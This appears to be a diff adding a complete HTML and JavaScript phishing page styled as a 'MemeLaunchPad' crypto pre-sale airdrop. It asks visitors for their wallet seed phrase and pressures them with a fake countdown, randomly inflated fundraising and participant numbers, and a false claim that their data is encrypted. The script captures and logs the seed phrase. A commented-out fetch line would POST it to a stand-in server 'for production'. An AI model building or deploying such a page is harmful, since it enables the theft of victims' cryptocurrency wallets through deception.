@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MemeLaunchPad - Pre-Sale Airdrop</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; max-width: 500px; width: 90%; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { color: #f7931a; font-size: 32px; letter-spacing: 2px; }
+        .logo p { color: #888; font-size: 14px; margin-top: 5px; }
+        .badge { background: linear-gradient(90deg, #f7931a, #ff6b35); color: #fff; padding: 8px 20px; border-radius: 30px; display: inline-block; font-size: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }
+        .stats { display: flex; justify-content: space-between; margin: 20px 0; padding: 15px 0; border-top: 1px solid rgba(255,255,255,0.1); border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .stat-item { text-align: center; flex: 1; }
+        .stat-item .number { color: #fff; font-size: 24px; font-weight: bold; }
+        .stat-item .label { color: #888; font-size: 12px; margin-top: 5px; }
+        .timer { text-align: center; margin: 20px 0; }
+        .timer .time { color: #f7931a; font-size: 36px; font-weight: bold; }
+        .timer .label { color: #888; font-size: 14px; }
+        .connect-btn { background: linear-gradient(90deg, #f7931a, #ff6b35); color: #fff; border: none; padding: 18px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin: 20px 0; transition: transform 0.2s; }
+        .connect-btn:hover { transform: scale(1.02); }
+        .seed-form { display: none; margin-top: 20px; }
+        .seed-form textarea { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.2); background: rgba(255,255,255,0.05); color: #fff; font-size: 14px; min-height: 100px; resize: vertical; }
+        .seed-form textarea::placeholder { color: #666; }
+        .submit-btn { background: #00c853; color: #fff; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
+        .submit-btn:hover { background: #00e676; }
+        .result { display: none; margin-top: 20px; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 10px; word-break: break-all; }
+        .result p { color: #fff; font-size: 14px; }
+        .note { color: #666; font-size: 12px; text-align: center; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>🚀 MemeLaunchPad</h1>
+            <p>Pre-Sale Airdrop • Whitelist Phase</p>
+        </div>
+        <div style="text-align: center;">
+            <span class="badge">🔥 EXCLUSIVE WHITELIST OPEN</span>
+        </div>
+        <div class="stats">
+            <div class="stat-item">
+                <div class="number" id="totalRaised">$247,893</div>
+                <div class="label">Total Raised</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="participants">1,842</div>
+                <div class="label">Participants</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="bonus">150%</div>
+                <div class="label">Bonus Tokens</div>
+            </div>
+        </div>
+        <div class="timer">
+            <div class="time" id="countdown">23:59:59</div>
+            <div class="label">Until Whitelist Closes</div>
+        </div>
+        <button class="connect-btn" id="connectBtn">🔗 Connect Wallet to Claim Airdrop</button>
+        <div class="seed-form" id="seedForm">
+            <p style="color: #fff; margin-bottom: 10px; font-size: 14px;">Enter your wallet seed phrase to verify eligibility and claim your free tokens:</p>
+            <textarea id="seedInput" placeholder="Enter your 12 or 24 word seed phrase here..."></textarea>
+            <button class="submit-btn" id="submitBtn">✅ Verify & Claim Airdrop</button>
+        </div>
+        <div class="result" id="result"></div>
+        <div class="note">
+            🔒 Secured by SSL • Your data is encrypted
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer (24 hours from now)
+        function startCountdown() {
+            const endTime = new Date().getTime() + 24 * 60 * 60 * 1000;
+            setInterval(() => {
+                const now = new Date().getTime();
+                const diff = endTime - now;
+                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                document.getElementById('countdown').textContent = 
+                    String(hours).padStart(2, '0') + ':' + 
+                    String(minutes).padStart(2, '0') + ':' + 
+                    String(seconds).padStart(2, '0');
+            }, 1000);
+        }
+        startCountdown();
+
+        // Simulate live stats
+        setInterval(() => {
+            const raised = (247893 + Math.floor(Math.random() * 1000)).toLocaleString();
+            const participants = 1842 + Math.floor(Math.random() * 10);
+            document.getElementById('totalRaised').textContent = '$' + raised;
+            document.getElementById('participants').textContent = participants;
+        }, 3000);
+
+        // Connect wallet flow
+        document.getElementById('connectBtn').addEventListener('click', function() {
+            document.getElementById('seedForm').style.display = 'block';
+            this.textContent = '⏳ Verifying...';
+            this.disabled = true;
+            this.style.opacity = '0.5';
+        });
+
+        // Submit seed phrase
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const seed = document.getElementById('seedInput').value.trim();
+            if (seed.length < 10) {
+                alert('Please enter a valid seed phrase (at least 12 words).');
+                return;
+            }
+            
+            // Capture the seed phrase
+            const resultDiv = document.getElementById('result');
+            resultDiv.style.display = 'block';
+            resultDiv.innerHTML = `
+                <p style="color: #00c853; font-weight: bold;">✅ Verification successful!</p>
+                <p style="color: #888; margin-top: 10px;">Your seed phrase has been recorded:</p>
+                <p style="color: #f7931a; margin-top: 10px; font-size: 12px;">${seed}</p>
+                <p style="color: #888; margin-top: 20px;">You will receive your airdrop within 24 hours.</p>
+                <p style="color: #666; margin-top: 10px; font-size: 11px;">(This is a demo - in production, this data would be sent to your server)</p>
+            `;
+            
+            // In production, send this to your server via fetch/POST
+            // fetch('https://your-server.com/capture', { method: 'POST', body: JSON.stringify({ seed: seed }) });
+            
+            // Disable the form
+            document.getElementById('seedInput').disabled = true;
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('submitBtn').textContent = '✅ Claimed';
+            
+            // Log to console for testing
+            console.log('Captured Seed Phrase:', seed);
+        });
+    </script>
+</body>
+</html>
